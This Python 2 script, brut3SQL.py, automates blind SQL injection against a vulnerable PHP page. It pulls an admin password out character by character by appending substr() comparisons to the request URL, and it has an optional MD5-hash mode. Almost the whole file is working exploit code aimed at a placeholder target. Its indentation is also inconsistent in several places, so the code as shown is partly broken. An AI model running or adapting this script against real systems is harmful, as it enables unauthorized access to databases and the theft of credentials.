#!/usr/bin/python
# -*- coding: utf-8 -*-

###########################################################
#              brut3SQL.py 0.1 / ky0p - 2014              #
###########################################################
# Brute-force an sql account login/password               #
###########################################################

import sys
import argparse
import requests
import re

#if cookies are required:
#cookies=dict(COOKIE_01='',COOKIE_02='XX')
#else
cookies=""

#if Basic Digest Authentication is required
#auth=HTTPBasicAuth('user', 'pass'))
#else
auth=""
	
#ASCII code for regular BF:
#Start = 32 -> Space
#End  = 126 -> ~

#ASCII code for MD5 BF:
#Start = 48 -> 0
#End   = 57 -> 9
#then
#97  -> a
#102 -> f

currentCar=32 # Regular BF Start (32 -> Space)
asciiEnd=126 # Regular BF End (126 -> ~)
totalLenght=40 #We assume the password is about 40 bytes long

#If the password is a MD5 hash, makes the BF run faster
md5=0 #Boolean, 0 is off, 1 is on
found=0 #Password not found yet at this state
currentLenght=1 #We start by the first letter
targetUrl="http://target.com/sqlinjection/vulnerable.php&id=1" #URL of the target
failAccess="no such user" #What to search for in case the request succeed but no matches found
finalPass="" #Our final pass will be here

print u"[>>] Starting brut3SQL..."

if (md5==1):
    print u"[>>] Using MD5 mode..."
	    currentCar=48 # MD5 BF Start (48 -> 0)
	    asciiEnd=102 # MD5 BF End (102 -> f)
	    totalLenght=32 #MD5's 32 bytes long

while(found==0 and currentCar<asciiEnd):
	  if (md5==1 and currentCar==58):
		  currentCar=currentCar+39 #We jump to 97 -> a
	  if (currentCar==95): #95 -> _ , we don't want this
		  currentCar+=1
	  url=targetUrl+" and login=\"admin\" and substr(pass,"+str(currentLenght)+",1"+")=\""+str(chr(currentCar))+"\""
	  #if the request is GET
	  #result=requests.get(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth).content
	  #if the request is POST
	  payload = {'login': 'foo', 'password': 'bar'} #POST variables
	  result=requests.post(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth, data=payload).content
	  res=re.search("no such user", result)
	  if res is None: #No errors, the letter's good
		  if (currentLenght!=totalLenght): #Until we're finished...
			  print "["+str(currentLenght)+"/"+str(totalLenght)+"] " + finalPass #We show progress, comment this to go faster
			  finalPass+=chr(currentCar)
			  currentLenght+=1
			  #We start over
			  if (md5==1):
			      currentCar=48 #48 -> 0
			  else:
			      currentCar=32 #32 -> Space
		  else:
              finalPass+=chr(currentCar)
              found=1
	  else:
          currentCar+=1 #This letter's bad, we continue

print (u"[\o/] Pass found : %s " % finalPass)

sys.exit(0)
